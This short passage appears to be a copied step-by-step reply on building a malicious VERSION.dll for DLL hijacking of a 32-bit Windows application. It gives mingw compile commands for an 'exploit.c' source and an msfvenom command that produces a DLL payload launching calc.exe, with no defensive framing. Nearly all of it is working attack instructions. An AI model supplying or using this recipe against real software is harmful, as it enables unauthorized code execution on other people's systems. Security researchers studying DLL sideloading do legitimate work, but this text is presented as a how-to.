Compile it as 32-bit DLL.
Linux/Kali: i686-w64-mingw32-gcc -shared -o VERSION.dll exploit.c
Windows (MinGW): gcc -shared -o VERSION.dll exploit.c -m32
Note: Ensure the output file is named exactly VERSION.dll.
Method B: The msfvenom Way (Fastest)
If you are using Kali Linux:
Open your terminal.
Run the following command (Note the x86 implies 32-bit):
code
Bash
msfvenom -p windows/exec CMD=calc.exe -f dll -o VERSION.dll
(If the app was 64-bit, you would use windows/x64/exec, but stick to the one above).